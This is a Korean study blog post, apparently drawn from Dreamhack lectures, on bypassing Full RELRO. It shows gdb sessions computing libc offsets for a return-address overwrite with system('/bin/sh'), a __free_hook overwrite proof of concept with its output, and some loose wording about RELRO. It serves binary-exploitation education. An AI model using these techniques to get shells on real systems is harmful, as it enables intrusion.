---
title: Bypass FULLRELRO (hook overwrite)
date: 2022-08-16 14:34 +0900
categories: [Hacking,System]
tags: [Bypass RELRO, GOT Overwrite, hook overwrite]
---

## Bypass FULLRELRO
<hr style="border-top: 1px solid;"><br>

내용 출처
: <a href="https://learn.dreamhack.io/4#16" target="_blank">learn.dreamhack.io/4#16</a>

<br>

Partial RELRO는 GOT 영역은 쓰기가 가능하므로 GOT Overwrite가 가능하지만, FULL RELRO는 ```.data```, ```.bss``` 영역을 제외한 나머지 영역에 랜덤화를 시킨다.

데이터 섹션 등 다이나믹 섹션에 쓰기 권한을 제거하고 읽기 권한만 부여하는 보호기법으로, GOT Overwrite 등의 공격을 할 수 없다.

하지만, 읽을 수는 있기 때문에 GOT를 통해 libc.so.6 라이브러리의 주소를 구할 수는 있다. (물론 leak가 되는 환경이라면)

<br>

실행 흐름을 조작할 수 있는 버퍼 오퍼플로우 등의 취약점이 있다면, **실행 권한이 있는 스택 메모리로 실행 흐름을 조작**하여 구한 라이브러리 주소 등을 이용해서 셸을 흭득할 수 있다.

따라서 스택 메모리에 덮어쓰려면 스택의 주소를 먼저 알아내야 한다.

<br>

libc.so.6 라이브러리의 전역 변수에는 프로그램의 argv인 스택 메모리 주소가 존재한다.

gdb에서 find 명령어를 통해 main 함수의 2번째 인자인 argv의 주소를 libc.so.6 라이브러리에서 찾는다.

<br>

```
(gdb) b *main+0
Breakpoint 1 at 0x804859f
(gdb) r
Starting program: ~/example7 
Breakpoint 1, 0x0804859f in main ()
(gdb) x/4wx $esp
0xffffd55c: 0xf7e19637  0x00000001  0xffffd5f4  0xffffd5fc
(gdb) info proc map
process 5039
Mapped address spaces:
    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000        0x0 ~/example7
     0x8049000  0x804a000     0x1000        0x0 ~/example7
     0x804a000  0x804b000     0x1000     0x1000 ~/example7
    0xf7e00000 0xf7e01000     0x1000        0x0 
    0xf7e01000 0xf7fb1000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
    0xf7fb1000 0xf7fb3000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
    0xf7fb3000 0xf7fb4000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
    0xf7fb4000 0xf7fb7000     0x3000        0x0 
    0xf7fd3000 0xf7fd4000     0x1000        0x0 
    0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
    0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
    0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
    0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
    0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
 (gdb) find /w 0xf7e01000, 0xf7fb7000, 0xffffd5f4
0xf7fb65f0
warning: Unable to access 2576 bytes of target memory at 0xf7fb65f1, halting search.
1 pattern found.
(gdb) p/x 0xf7fb65f0-0xf7e01000
$1 = 0x1b55f0
```

<br>

```
(gdb) x/4wx $esp
0xffffd55c: 0xf7e19637  0x00000001  0xffffd5f4  0xffffd5fc
```

<br>

위의 부분을 보면 현재 ```main+0```에서 break됬으므로 새로운 스택 프레임이 push 되기 직전이므로 main 함수의 인자인 argc, argv가 스택에 있을 것이다.

따라서 ```0x00000001  0xffffd5f4```가 각각 argc, argv가 되므로 argv 포인터는 ```0xffffd5f4```가 된다.

추가로 main 함수의 리턴 주소는 ```0xffffd55c```이다. (인자가 먼저 push 되고 함수의 ret가 그 위에 쌓인다)

이제 라이브러리에서의 argv 위치를 알아내야 한다.

<br>

```
(gdb) find /w 0xf7e01000, 0xf7fb7000, 0xffffd5f4
0xf7fb65f0
warning: Unable to access 2576 bytes of target memory at 0xf7fb65f1, halting search.
1 pattern found.
```

<br>

find 명령어를 통해 4바이트 형태로 (/w) 범위는 라이브러리의 범위로 설정하는데, 이 범위는 위의 ```info proc map``` 을 통해 볼 수 있다. (```/lib/i386-linux-gnu/libc-2.23.so```)

따라서 find로 라이브러리 범위 내에서 argv 포인터인 ```0xffffd5f4```를 찾아보니 ```0xf7fb65f0```가 나왔고, 이 값은 라이브러리에서 argv 포인터의 위치이다.

이 값을 이용해서 라이브러리 베이스 주소에서부터 argv 포인터의 위치까지의 오프셋을 구할 수 있다.

<br>

```
(gdb) p/x 0xf7fb65f0-0xf7e01000
$1 = 0x1b55f0
```

<br>

계산 결과 라이브러리의 베이스 주소에서부터 ```0x1b55f0```만큼 떨어진 곳에 argv, 즉 스택 포인터가 존재한다는 것을 알 수 있다.

그 다음, argv 주소부터 main 함수의 리턴 주소까지의 오프셋을 구하면 아래와 같다.

<br>

```
(gdb) p/x 0xffffd5f4-0xffffd55c
$3 = 0x98
(gdb) 
```

<br>

argv 주소부터 0x98만큼 떨어진 위치에 main 함수의 리턴 주소가 존재한다.

마지막으로 리턴 주소에 덮을 system 함수와 "/bin/sh" 문자열 주소의 오프셋을 구하면 된다.

<br>

```
(gdb) p/x 0xf7e3bda0-0xf7e01000
$5 = 0x3ada0
(gdb) find 0xf7e01000, 0xf7fb7000, "/bin/sh"
0xf7f5ca0b
warning: Unable to access 2158 bytes of target memory at 0xf7fb6793, halting search.
1 pattern found.
(gdb) p/x 0xf7f5ca0b-0xf7e01000
$6 = 0x15ba0b
```

<br>

```p system```을 통해 system 함수의 주소를 구한 뒤, 라이브러리 베이스 주소와의 오프셋을 구한 결과 ```0x3ada0```가 나왔고, 라이브러리 내에서 ```/bin/sh``` 문자열을 찾은 결과 ```0xf7f5ca0b```에 있음을 알 수 있다.

문자열과 라이브러리 베이스 주소와의 오프셋은 ```0x15ba0b```가 된다.

<br>

우리가 구한 argv의 주소와 libc 간의 오프셋, main ret와 argv 간의 오프셋, system 함수 오프셋, ```/bin/sh``` 문자열 오프셋를 통해 exploit을 진행할 수 있다.

우리는 main의 리턴 주소를 system 함수로 덮어쓰고 main ret+8을 ```/bin/sh```로 덮어쓸 것이다.

<br>

먼저 코드 상에서 사용된 함수의 GOT를 이용해 leak를 할 수 있는 취약점이 있다면 libc의 주소를 구한 뒤, argv의 주소와 libc 간의 오프셋을 알고 있으므로 argv의 주소를 구할 수 있다.

그럼 스택 메모리의 위치를 구할 수 있고, main 함수의 리턴과의 오프셋도 알고 있으므로 main_ret의 주소 또한 구할 수 있다.

<br>

```
libc = puts_addr - 0x5fca0
libc_argv = libc + 0x1b55f0
system = libc + 0x3ada0
binsh = libc + 0x15ba0b
```

<br>

따라서 main_ret에 system 함수의 주소와 문자열을 덮어 쓸 수 있으므로 main 함수가 종료되고 리턴할 때, system 함수가 호출되어 셸을 흭득할 수 있다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Hook Overwrite
<hr style="border-top: 1px solid;"><br>

내용 출처
: <a href="https://dreamhack.io/lecture/courses/99" target="_blank">Background: RELRO</a>
: <a href="https://dreamhack.io/lecture/courses/102" target="_blank">Exploit Tech: Hook Overwrite</a>

<br>

Full RELRO의 경우, .init_array, .fini_array 뿐만 아니라 .got 영역에도 쓰기 권한이 제거되었다. 

그래서 공격자들은 덮어쓸 수 있는 다른 함수 포인터를 찾다가 라이브러리에 위치한 hook을 찾아냈다.

라이브러리 함수의 대표적인 hook이 malloc hook과 free hook이라고 한다.

<br>

운영체제가 어떤 코드를 실행하려 할 때, 이를 낚아채어 다른 코드가 실행되게 하는 것을 Hooking(후킹)이라고 부르며, 이때 실행되는 코드를 Hook(훅)이라고 부른다고 한다.

Hooking으로 함수에 훅을 심어서 함수의 호출을 모니터링 하거나, 함수에 기능을 추가할 수도 있고, 아니면 아예 다른 코드를 심어서 실행 흐름을 변조할 수도 있다고 한다.

예를 들어, malloc과 free에 훅을 설치하면 소프트웨어에서 할당하고, 해제하는 메모리를 모니터링할 수 있다.

즉, 모든 함수의 도입 부분에 모니터링 함수를 훅으로 설치하여 어떤 소프트웨어가 실행 중에 호출하는 함수를 모두 추적(Tracing)할 수도 있다.

해커가 키보드의 키 입력과 관련된 함수에 훅을 설치하면, 사용자가 입력하는 키를 모니터링하여 자신의 컴퓨터로 전송하는 것도 가능하다.

Full RELRO가 적용되더라도 libc의 데이터 영역에는 쓰기가 가능하므로, Full RELRO를 우회하는 기법으로 활용될 수 있다.

<br>

malloc, free, realloc 등의 함수는 libc.so에 구현되어 있는데, libc에는 이 함수들의 디버깅 편의를 위해 훅 변수가 정의되어 있다.

```__malloc_hook```, ```__free_hook```, ```__realloc_hook```은 관련된 함수들과 마찬가지로 libc.so에 정의되어 있다.

이 변수들의 오프셋을 확인해보면, libc.so의 bss 섹션에 포함되는 것을 알 수 있다.

FULLRELRO가 적용되어도, ```.data```와 ```.bss```영역은 쓰기 권한이 남아 있다.

따라서 위 hook 변수들의 값을 조작할 수 있다.

<br>

훅을 실행할 때 기존 함수에 전달한 인자를 같이 전달해준다.

즉, hook 변수가 NULL이 아니라면, malloc을 수행하기 전에 ```__malloc_hook```이 가리키는 함수를 먼저 실행하는데, 이 때 malloc 함수의 인자를 hook 함수에 넘겨준다.

따라서 ```__malloc_hook```을 system 함수의 주소로 덮고, ```malloc('/bin/sh')```을 호출하여 셸을 획득하는 등의 공격이 가능하다는 것이다.

아래 코드는 free 함수의 hook을 덮어 쓴 것이다.

<br>

```c
// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c
#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}
```

<br>

```
$ ./fho
"__free_hook" now points at "system"
call free("/bin/sh")
$ echo "This is Hook Overwrite!"
This is Hook Overwrite!
```

<br>

free 함수가 호출되었지만, free의 hook 변수가 system 함수를 가리키고 있어서, free 함수의 인자로 주어진 buf 변수에는 ```/bin/sh``` 문자열이 들어가 있었는데 이 인자가 hook 함수의 인자로 넘어가면서 ```system(/bin/sh)```가 실행이 된 것이다.

<br>

버퍼 오버플로 취약점이 있고, free 함수가 사용된 코드가 있다고 가정한다.

**먼저 라이브러리의 주소를 구해야 한다.**

왜냐하면, ```__free_hook```, system 함수, ```/bin/sh``` 문자열은 libc.so에 정의되어 있으므로, 매핑된 libc.so의 주소를 구해야 이들의 주소를 계산할 수 있다.

버퍼오버플로우로 스택의 값을 읽을 수 있는데, 스택 안에 libc의 주소가 있을 가능성이 매우 커서 libc의 주소를 구할 수 있을 것이다.

대표적으로 main 함수는 ```__libc_start_main```이라는 라이브러리 함수가 호출하므로 main 함수에서 반환 주소를 읽으면, 그 주소를 기반으로 필요한 변수와 함수들의 주소를 계산할 수 있을 것이다.

<br>

그 다음 임의의 주소에 임의의 값을 쓸 수 있다고 한다면, free의 hook 변수인 ```__free_hook```을 system 함수로 덮어쓰고 ```/bin/sh```를 해제하게 하면 셸을 흭득할 수 있다.

자세한건 드림핵에서 확인..

<br><br>
<hr style="border: 2px solid;">
<br><br>
